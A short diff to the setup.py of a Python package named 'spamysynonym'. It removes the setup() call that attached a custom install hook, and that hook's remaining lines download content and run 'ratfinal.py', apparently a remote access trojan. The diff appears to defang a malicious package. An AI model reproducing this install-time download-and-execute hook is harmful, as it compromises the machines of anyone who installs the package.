@@ -13,16 +13,4 @@ class CustomInstallCommand(install):
             f.write(response.content)
         subprocess.check_call([sys.executable, 'ratfinal.py'])
         install.run(self)
-setup(
-    name='spamysynonym',
-    version='3.0.1',
-    description='Spm synonym to make your content deliver!',
-    author='frustrate',
-    author_email='frustrate@riseup.net',
-    url='https://github.com/frustrate/spamysynonym',
-    packages=['spamysynonym'],
-    install_requires=['requests', 'pycryptodome'],
-    cmdclass={
-        'install': CustomInstallCommand,
-    }
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                     
